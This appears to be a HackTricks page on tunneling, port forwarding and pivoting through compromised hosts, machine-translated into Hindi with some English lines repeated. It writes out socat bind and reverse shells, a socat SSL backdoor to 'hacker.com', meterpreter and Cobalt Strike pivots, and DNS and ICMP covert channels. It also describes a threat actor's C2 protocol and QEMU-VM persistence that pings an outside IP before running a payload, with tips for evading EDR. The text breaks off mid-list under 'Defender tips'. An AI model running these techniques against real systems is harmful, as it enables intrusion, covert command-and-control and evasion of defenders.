# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap tip

> [!WARNING]
> **ICMP** और **SYN** स्कैन socks proxies के माध्यम से टनल नहीं किए जा सकते, इसलिए हमें **disable ping discovery** (`-Pn`) करना होगा और इस काम के लिए **TCP scans** (`-sT`) निर्दिष्ट करने होंगे।

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH ग्राफिकल कनेक्शन (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

SSH Server में नया Port खोलें --> अन्य port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Local port --> Compromised host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

स्थानीय पोर्ट --> समझौता किया गया होस्ट (SSH) --> कहीं भी
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

यह internal hosts से DMZ के माध्यम से आपके host पर reverse shells प्राप्त करने के लिए उपयोगी है:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

आपको दोनों डिवाइसों पर **root** होना चाहिए (क्योंकि आप नए इंटरफ़ेस बनाने जा रहे हैं) और sshd कॉन्फ़िग को root login की अनुमति देनी होगी:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
सर्वर साइड पर फ़ॉरवर्डिंग सक्षम करें
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
क्लाइंट साइड पर नया रूट सेट करें
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **सुरक्षा – Terrapin Attack (CVE-2023-48795)**
> 2023 का Terrapin downgrade हमला man-in-the-middle को प्रारंभिक SSH हैंडशेक में छेड़छाड़ करने और **any forwarded channel** ( `-L`, `-R`, `-D` ) में डेटा इंजेक्ट करने की अनुमति दे सकता है। सुनिश्चित करें कि दोनों client और server patched हों (**OpenSSH ≥ 9.6/LibreSSH 6.7**) या SSH tunnels पर भरोसा करने से पहले `sshd_config`/`ssh_config` में कमजोर `chacha20-poly1305@openssh.com` और `*-etm@openssh.com` एल्गोरिद्म को स्पष्ट रूप से disable कर दें।

## SSHUTTLE

आप एक host के माध्यम से **ssh** के जरिए किसी **subnetwork** तक सभी **traffic** को **tunnel** कर सकते हैं.\\
For example, forwarding all the traffic going to 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
private key के साथ कनेक्ट करें
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Local port --> Compromised host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
एक और तरीका:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

teamserver में सभी इंटरफ़ेस पर सुनने वाले एक पोर्ट को खोलें, जिसे ट्रैफ़िक को **beacon के माध्यम से रूट करने** के लिए उपयोग किया जा सके।
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> इस मामले में, **port is opened in the beacon host**, Team Server में नहीं, और ट्रैफ़िक Team Server को भेजा जाता है और वहाँ से निर्दिष्ट host:port पर भेजा जाता है।
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
ध्यान दें:

- Beacon's reverse port forward इस तरह डिज़ाइन किया गया है कि यह **Team Server तक traffic को tunnel करता है, न कि individual machines के बीच relaying के लिए**।
- Traffic **Beacon's C2 traffic के भीतर tunneled किया जाता है**, जिसमें P2P links भी शामिल हैं।
- **Admin privileges की आवश्यकता नहीं होती** reverse port forwards को high ports पर बनाने के लिए।

### rPort2Port local

> [!WARNING]
> इस मामले में, **port beacon host में open किया जाता है**, Team Server में नहीं, और **traffic Cobalt Strike client को भेजा जाता है** (Team Server को नहीं) और वहाँ से निर्दिष्ट host:port तक।
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeOrg)

आपको एक web file tunnel अपलोड करने की आवश्यकता है: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

आप इसे [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
आपको client और server दोनों के लिए **एक ही संस्करण** उपयोग करना होगा

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**agent और proxy के लिए एक ही संस्करण का उपयोग करें**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent Binding and Listening
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### एजेंट के लोकल पोर्ट्स तक पहुँच
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. Tunnel victim की मशीन से शुरू होती है।\
127.0.0.1:1080 पर एक socks4 proxy बनाया जाता है।
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot के माध्यम से **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port के माध्यम से socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter के माध्यम से SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
आप लक्ष्य के कंसोल में आखिरी लाइन की बजाय यह लाइन चला कर एक **non-authenticated proxy** बायपास कर सकते हैं:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

दोनों पक्षों पर प्रमाणपत्र बनाएं: Client और Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

स्थानीय SSH port (22) को attacker host के 443 port से कनेक्ट करें
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

यह एक कंसोल PuTTY संस्करण जैसा है (विकल्प ssh client के बहुत समान हैं)।

चूँकि यह binary victim पर चलाया जाएगा और यह एक ssh client है, हमें अपनी ssh service और port खोलने होंगे ताकि हम एक reverse connection प्राप्त कर सकें। फिर, केवल locally accessible port को हमारी machine के किसी port पर forward करने के लिए:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

आपको local admin होना चाहिए (किसी भी पोर्ट के लिए)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

आपको सिस्टम पर **RDP access** होना चाहिए.\
डाउनलोड:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - यह टूल Windows के Remote Desktop Service फीचर के `Dynamic Virtual Channels` (`DVC`) का उपयोग करता है। DVC **tunneling packets over the RDP connection** के लिए जिम्मेदार है।
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

अपने क्लाइंट कंप्यूटर पर **`SocksOverRDP-Plugin.dll`** को इस तरह लोड करें:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
अब हम **RDP** के माध्यम से **victim** से **connect** कर सकते हैं **`mstsc.exe`** का उपयोग करके, और हमें एक **prompt** मिलना चाहिए जिसमें कहा गया हो कि **SocksOverRDP plugin is enabled**, और यह **127.0.0.1:1080** पर **listen** करेगा।

**Connect** via **RDP** और victim machine में `SocksOverRDP-Server.exe` binary को upload & execute करें:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
अब अपनी मशीन (attacker) पर पुष्टि करें कि port 1080 listening है:
```
netstat -antb | findstr 1080
```
अब आप [**Proxifier**](https://www.proxifier.com/) **उस पोर्ट के माध्यम से ट्रैफ़िक को प्रॉक्सी करने के लिए उपयोग कर सकते हैं।**

## Proxify Windows GUI ऐप्स

आप [**Proxifier**](https://www.proxifier.com/) का उपयोग करके Windows GUI ऐप्स को एक प्रॉक्सी के माध्यम से रूट करवा सकते हैं।\
In **Profile -> Proxy Servers** में SOCKS सर्वर का IP और पोर्ट जोड़ें।\
In **Profile -> Proxification Rules** में उस प्रोग्राम का नाम जोड़ें जिसे आप प्रॉक्सी करना चाहते हैं और उन IPs के लिए कनेक्शन्स जोड़ें जिन्हें आप प्रॉक्सी करना चाहते हैं।

## NTLM proxy bypass

पहले उल्लेखित टूल: **Rpivot**\
**OpenVPN** भी इसे बायपास कर सकता है, कॉन्फ़िगरेशन फ़ाइल में ये विकल्प सेट करके:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

यह proxy के साथ authenticate करता है और स्थानीय रूप से एक port bind करता है जिसे आप द्वारा निर्दिष्ट external service पर forward किया जाता है। फिर आप इस port के माध्यम से अपनी पसंद का tool इस्तेमाल कर सकते हैं।\
उदाहरण के लिए यह port 443 को forward करता है
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Now, if you set for example in the victim the **SSH** service to listen in port 443. You can connect to it through the attacker port 2222.\
You could also use a **meterpreter** that connects to localhost:443 and the attacker is listening in port 2222.

## YARP

Microsoft द्वारा बनाया गया reverse proxy। आप इसे यहाँ पा सकते हैं: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

दोनों सिस्टम्स में Root की आवश्यकता होती है ताकि tun adapters बनाए जा सकें और DNS queries का उपयोग करके उनके बीच data को tunnel किया जा सके।
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
टनल बहुत धीमी होगी। आप इस टनल के माध्यम से एक compressed SSH connection बना सकते हैं, इसके लिए उपयोग करें:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

DNS के माध्यम से एक C\&C चैनल स्थापित करता है। इसे root privileges की आवश्यकता नहीं होती।
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

आप [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) का उपयोग करके powershell में एक dnscat2 client चला सकते हैं:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding के साथ dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### proxychains DNS बदलें

Proxychains इंटरसेप्ट करता है `gethostbyname` libc call और socks proxy के माध्यम से tcp DNS request को tunnel करता है। By **default** proxychains द्वारा उपयोग किया जाने वाला **DNS** server **4.2.2.2** (hardcoded) है। इसे बदलने के लिए फाइल एडिट करें: _/usr/lib/proxychains3/proxyresolv_ और IP बदलें। यदि आप **Windows environment** में हैं तो आप **domain controller** का IP सेट कर सकते हैं।

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor ने एक **dual-channel C2 ("AK47C2")** बनाया जो केवल आउटबाउंड **DNS** और **plain HTTP POST** ट्रैफ़िक का दुरुपयोग करता है — ये दोनों प्रोटोकॉल कॉर्पोरेट नेटवर्क पर आमतौर पर ब्लॉक नहीं होते।

1. **DNS mode (AK47DNS)**
• यादृच्छिक 5-character SessionID जनरेट करता है (उदा. `H4T14`)।
• *task requests* के लिए `1` या *results* के लिए `2` को प्रीपेंड करता है और विभिन्न फ़ील्ड्स (flags, SessionID, computer name) को concatenate करता है।
• हर फ़ील्ड को **XOR-encrypted with the ASCII key `VHBD@H`**, hex-encoded किया जाता है और डॉट्स से जोड़ा जाता है — अंत में attacker-controlled domain के साथ समाप्त होता है:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests **TXT** (और fallback **MG**) रिकॉर्ड्स के लिए `DnsQuery()` का उपयोग करती हैं।  
• जब response 0xFF बाइट्स से बड़ा होता है तो backdoor डेटा को 63-byte टुकड़ों में **fragment** करता है और markers डालता है: `s<SessionID>t<TOTAL>p<POS>` ताकि C2 सर्वर उन्हें reorder कर सके।

2. **HTTP mode (AK47HTTP)**
• एक JSON envelope बनाता है:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• पूरा blob XOR-`VHBD@H` → hex → **`POST /`** के बॉडी के रूप में भेजा जाता है, हेडर `Content-Type: text/plain` के साथ।  
• reply भी वही encoding फॉलो करता है और `cmd` फ़ील्ड को `cmd.exe /c <command> 2>&1` के साथ execute किया जाता है।

Blue Team नोट्स
• असामान्य **TXT queries** देखें जिनका पहला लेबल लंबा hexadecimal होता है और हमेशा किसी दुर्लभ domain पर खत्म होता है।  
• एक स्थिर XOR key के बाद ASCII-hex होना YARA से आसानी से detect किया जा सकता है: `6?56484244?484` (`VHBD@H` in hex)।  
• HTTP के लिए, text/plain POST बॉडीज़ जिन्हें केवल hex बना हो और दो बाइट्स के गुणक हों, को flag करें।

{{#note}}
संपूर्ण चैनल **standard RFC-compliant queries** के भीतर फिट बैठता है और हर सब-डोमेन लेबल को 63 बाइट्स से कम रखता है, जिससे यह अधिकांश **DNS** लॉग में stealthy रहता है।
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

दोनों सिस्टम में tun adapters बनाने और ICMP echo requests का उपयोग करके उनके बीच डेटा tunnel करने के लिए root की आवश्यकता होती है।
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**यहाँ से डाउनलोड करें**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **एक ऐसा टूल है जो एक कमांड लाइन में समाधान को इंटरनेट पर एक्सपोज़ करने के लिए उपयोग होता है।**\
_एक्सपोज़ किए गए URI इस तरह होते हैं:_ **UID.ngrok.io**

### स्थापना

- एक अकाउंट बनायें: https://ngrok.com/signup
- क्लाइंट डाउनलोड:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### बुनियादी उपयोग

**दस्तावेज़:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_यदि आवश्यक हो तो authentication और TLS जोड़ना भी संभव है।_

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP के माध्यम से फाइलें एक्सपोज़ करना
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP कॉल्स को स्निफ़ करना

_XSS,SSRF,SSTI ... के लिए उपयोगी_\
stdout से सीधे या HTTP इंटरफ़ेस में [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### आंतरिक HTTP सेवा की टनलिंग
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml सरल कॉन्फ़िगरेशन उदाहरण

यह 3 tunnels खोलता है:

- 2 TCP
- 1 HTTP जिसमें /tmp/httpbin/ से स्थैतिक फ़ाइलों का प्रदर्शन होता है
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare’s `cloudflared` daemon आउटबाउंड tunnels बना सकता है जो **local TCP/UDP services** को बाहरी inbound firewall rules की आवश्यकता के बिना एक्सपोज़ करता है, और Cloudflare’s edge को मिलन बिंदु (rendez‑vous point) के रूप में उपयोग करता है। यह तब बहुत काम का होता है जब egress firewall केवल HTTPS ट्रैफ़िक की अनुमति देता है लेकिन inbound connections ब्लॉक होते हैं।

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### DNS के साथ स्थायी tunnels
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
कनेक्टर शुरू करें:
```bash
cloudflared tunnel run mytunnel
```
चूंकि सभी ट्रैफ़िक होस्ट से **outbound over 443** के माध्यम से निकलता है, Cloudflared tunnels ingress ACLs या NAT boundaries को बायपास करने का एक सरल तरीका हैं। ध्यान रखें कि यह बाइनरी आमतौर पर उच्चाधिकारों के साथ चलती है — जहाँ संभव हो containers या `--user` flag का उपयोग करें।

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) एक सक्रिय रूप से मेंटेन किया जाने वाला Go reverse-proxy है जो **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching** को सपोर्ट करता है। **v0.53.0 (May 2024)** से यह **SSH Tunnel Gateway** के रूप में काम कर सकता है, इसलिए target host केवल stock OpenSSH client का उपयोग करके एक reverse tunnel बना सकता है — कोई अतिरिक्त बाइनरी आवश्यक नहीं।

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### नया SSH gateway का उपयोग (बिना frpc binary)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
उपरोक्त कमांड victim’s पोर्ट **8080** को **attacker_ip:9000** के रूप में प्रकाशित करता है, बिना किसी अतिरिक्त tooling को डिप्लॉय किए — living-off-the-land pivoting के लिए आदर्श।

## Covert VM-based Tunnels with QEMU

QEMU’s user-mode networking (`-netdev user`) एक विकल्प `hostfwd` का समर्थन करती है जो **एक TCP/UDP पोर्ट को *host* पर bind करती है और उसे *guest* के अंदर forward करती है**. जब guest एक full SSH daemon चलाता है, तो hostfwd नियम आपको एक disposable SSH jump box देता है जो पूरी तरह से एक ephemeral VM के अंदर रहता है — EDR से C2 ट्रैफ़िक छिपाने के लिए परफेक्ट क्योंकि सारी malicious activity और फाइलें virtual disk में रहती हैं।

### त्वरित one-liner
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• ऊपर दिया गया कमांड RAM में एक **Tiny Core Linux** इमेज (`tc.qcow2`) लॉन्च करता है।
• Windows host पर पोर्ट **2222/tcp** पारदर्शी रूप से guest के अंदर **22/tcp** पर फॉरवर्ड होता है।
• attacker के दृष्टिकोण से target केवल पोर्ट 2222 को एक्सपोज़ करता है; इसके पास पहुँचने वाले किसी भी पैकेट को VM में चल रहा SSH server हैंडल करता है।

### VBScript के माध्यम से छिपकर लॉन्च करना
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Running the script with `cscript.exe //B update.vbs` keeps the window hidden.
  
स्क्रिप्ट को `cscript.exe //B update.vbs` के साथ चलाने पर विंडो छिपी रहती है।

### In-guest persistence

Because Tiny Core is stateless, attackers usually:

क्योंकि Tiny Core stateless है, हमलावर आम तौर पर:

1. Drop payload to `/opt/123.out`
2. Append to `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Add `home/tc` and `opt` to `/opt/filetool.lst` so the payload is packed into `mydata.tgz` on shutdown.

3. `/opt/filetool.lst` में `home/tc` और `opt` जोड़ते हैं ताकि shutdown पर payload `mydata.tgz` में पैक हो जाए।

### Why this evades detection

### यह खोज से कैसे बचता है

• Only two unsigned executables (`qemu-system-*.exe`) touch disk; no drivers or services are installed.  
• केवल दो unsigned executables (`qemu-system-*.exe`) डिस्क को छूते हैं; कोई drivers या services इंस्टॉल नहीं होते।  
• Security products on the host see **benign loopback traffic** (the actual C2 terminates inside the VM).  
• होस्ट पर security products को **benign loopback traffic** दिखाई देती है (असल C2 VM के अंदर समाप्त होता है)।  
• Memory scanners never analyse the malicious process space because it lives in a different OS.  
• Memory scanners कभी भी दुर्भावनापूर्ण process स्पेस का विश्लेषण नहीं करते क्योंकि यह अलग OS में रहता है।

### Defender tips

### Defender टिप्स

• Alert on **unexpected QEMU/VirtualBox/KVM binaries** in user-writable paths.  
